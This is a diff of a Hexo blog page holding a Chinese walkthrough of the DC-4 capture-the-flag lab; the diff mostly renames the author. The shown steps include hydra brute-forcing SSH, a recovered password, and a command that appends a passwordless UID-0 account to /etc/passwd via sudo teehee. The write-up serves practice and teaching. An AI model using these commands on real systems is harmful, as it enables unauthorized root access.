@@ -10,7 +10,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="dc-4">
 <meta property="og:url" content="http://example.com/2025/04/04/dc-4/index.html">
-<meta property="og:site_name" content="jujub3">
+<meta property="og:site_name" content="juju">
 <meta property="og:description" content="信息收集">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/dc-4/1735200523635-b8231a2d-b489-4de0-8630-0d2e9a7b6ff4.png">
@@ -48,7 +48,7 @@
 <meta property="og:image" content="http://example.com/dc-4/1735219284642-c2298a33-e992-476e-9f8e-57e22252ffd5.png">
 <meta property="article:published_time" content="2025-04-04T09:38:49.000Z">
 <meta property="article:modified_time" content="2025-04-04T09:41:19.839Z">
-<meta property="article:author" content="jujub3">
+<meta property="article:author" content="juju">
 <meta property="article:tag" content="DC">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/dc-4/1735200523635-b8231a2d-b489-4de0-8630-0d2e9a7b6ff4.png">
@@ -169,7 +169,7 @@
 
     <div class="meta">
       <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">jujub3</span>
+        <span class="p-name" itemprop="name">juju</span>
       </span>
       
     <div class="postdate">
@@ -274,7 +274,7 @@
 <p>hydra -l jim -P passwd.txt 192.168.3.2 ssh</p>
 <p><img src="/../dc-4/1735217007554-09f8486c-9ad2-49b6-9bba-5bccdded3dd3.png" alt="img"></p>
 <p>然后通过ssh连接jim</p>
-<p>ssh <a href="mailto:&#x6a;&#105;&#109;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#54;&#56;&#46;&#x33;&#46;&#x32;">jim@192.168.3.2</a></p>
+<p>ssh <a href="mailto:&#x6a;&#105;&#x6d;&#64;&#x31;&#57;&#x32;&#46;&#x31;&#54;&#56;&#46;&#51;&#x2e;&#50;">jim@192.168.3.2</a></p>
 <p>jibril04</p>
 <p><img src="/../dc-4/1735217172878-9880a29c-c887-48cd-87ee-b2e9ab3dc767.png" alt="img"></p>
 <p>然后发现jim里有一封邮件</p>
@@ -293,9 +293,8 @@
 <p>发现一个  -a用法，利用这点，可以直接向etc&#x2F;passwd中写入一些东西</p>
 <p><img src="/../dc-4/1735218445900-1e808523-05fa-4ca3-b6ef-bb88c2a00966.png" alt="img"></p>
 <p>利用管道符（  |  ）写入：admin::0:0:::&#x2F;bin&#x2F;bash</p>
-<pre><code class="language-plain">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd admin::0:0:::/bin/bash
-# 用户名admin 没有密码,第一个0表示超级用户，管理员权限 进入的时候运行/bin/bash
-</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd admin::0:0:::/bin/bash</span><br><span class="line"># 用户名admin 没有密码,第一个0表示超级用户，管理员权限 进入的时候运行/bin/bash</span><br></pre></td></tr></table></figure>
+
 <p>直接切换admin用户，无需密码，因为前面添加的时候没有设置密码</p>
 <p><img src="/../dc-4/1735219231147-dc724656-281d-44db-9139-0c80bd5affdb.png" alt="img"></p>
 <p>可以看到直接为root权限了，最后进入root目录，拿到flag<img src="/../dc-4/1735219284642-c2298a33-e992-476e-9f8e-57e22252ffd5.png" alt="img"></p>
@@ -379,7 +378,7 @@
     
     
     2025
-    jujub3
+    juju
   </div>
   <div class="footer-right">
     <nav>
